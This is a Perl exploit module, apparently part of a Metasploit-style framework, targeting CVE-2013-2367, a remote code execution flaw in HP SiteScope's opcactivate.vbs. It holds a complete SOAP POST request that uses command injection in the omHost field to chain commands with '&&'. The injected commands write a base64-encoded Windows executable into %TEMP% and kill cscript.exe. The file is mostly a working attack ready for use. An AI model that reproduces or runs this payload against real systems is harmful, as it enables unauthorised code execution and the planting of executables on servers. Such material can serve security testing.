package HP::MSF::HpSitescopeRunomagentcommand;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpSitescopeRunomagentcommand";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE         => "CVE-2013-2367",
  DESCRIPTION => "

          This module exploits a code execution flaw in HP SiteScope.

        The vulnerability exists in the opcactivate.vbs script, which

        is reachable from the APIBSMIntegrationImpl AXIS service, and

        uses WScript.Shell.run() to execute cmd.exe with user provided

        data. Note that the opcactivate.vbs component is installed

        with the (optional) HP Operations Agent component. The module

        has been tested successfully on HP SiteScope 11.20 (with HP

        Operations Agent) over Windows 2003 SP2.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "hp_sitescope_runomagentcommand",
  OSVDB       => 95824,
  PATH        => "services/APIBSMIntegrationImpl?",
  PATHS       => ["services/APIBSMIntegrationImpl", "SiteScope/"],
  PAYLOAD     => "",
  TITLE       => "HP SiteScope Remote Code Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to SiteScope", VALUE => "/SiteScope/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'services/APIBSMIntegrationImpl',
      PAYLOAD      => '<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:api="http://Api.freshtech.COM"><soapenv:Header/><soapenv:Body><api:runOMAgentCommand soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><in0 xsi:type="x-:Map" xmlns:x-="http://xml.apache.org/xml-soap"><item xsi:type="x-:mapItem"><key xsi:type="xsd:string">omHost</key><value xsi:type="xsd:string">&#x22;127.0.0.1 &#x26;&#x26; echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAIu9ESgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAADQdAAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>%TEMP%\aGTuD.b64 &#x26;&#x26; taskkill /F /IM cscript.exe &#x22;</value></item></in0><in1 xsi:type="xsd:string">OPCACTIVATE</in1></api:runOMAgentCommand></soapenv:Body></soapenv:Envelope>',
      TEXT   => 'Sending Exploit #1 Request : [POST] /services/APIBSMIntegrationImpl',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
